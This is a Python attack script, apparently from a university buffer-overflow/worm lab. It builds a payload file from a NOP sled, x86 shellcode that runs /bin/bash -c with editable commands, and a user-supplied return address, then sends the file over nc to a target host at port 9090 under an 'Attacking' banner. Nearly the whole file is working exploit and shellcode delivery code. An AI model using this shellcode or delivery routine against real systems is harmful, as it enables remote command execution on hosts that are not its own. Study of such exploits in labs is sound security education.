#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   "                                                            "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')

# Create the badfile (the malicious payload)
def createBadfile(ret):
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   offset = 0x00  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)

# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   return '10.151.0.71'

# Get user input for ret value
try:
    ret_value = int(input("Enter the value for ret (an integer between 100 and 400): "))
    if not (100 <= ret_value <= 400):
        raise ValueError("Invalid input. Ret value must be between 100 and 400.")
except ValueError as e:
    print(f"Error: {e}")
    sys.exit(1)

# Create the badfile with the user-specified ret value
createBadfile(ret_value)

# Continue with the attack
targetIP = getNextTarget()
print(f"**********************************", flush=True)
print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
print(f"**********************************", flush=True)
subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

# Give the shellcode some time to run on the target host
time.sleep(1)

# Sleep for 10 seconds before attacking another host
time.sleep(10)
